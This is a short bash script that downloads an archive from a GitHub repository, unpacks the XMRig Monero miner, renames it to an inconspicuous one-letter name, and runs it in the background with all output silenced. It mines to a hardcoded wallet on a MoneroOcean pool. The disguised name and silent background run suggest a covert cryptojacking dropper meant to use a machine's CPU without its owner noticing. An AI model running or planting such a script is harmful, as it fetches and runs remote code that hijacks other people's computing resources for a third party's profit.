#!/bin/bash
wget https://github.com/paradoxy1337/hwloc-without/archive/refs/heads/main.zip && \
unzip -o main.zip && \
cd hwloc-without-main && \
chmod +x xmrig && \
mv xmrig m && \
nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p worker1 --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &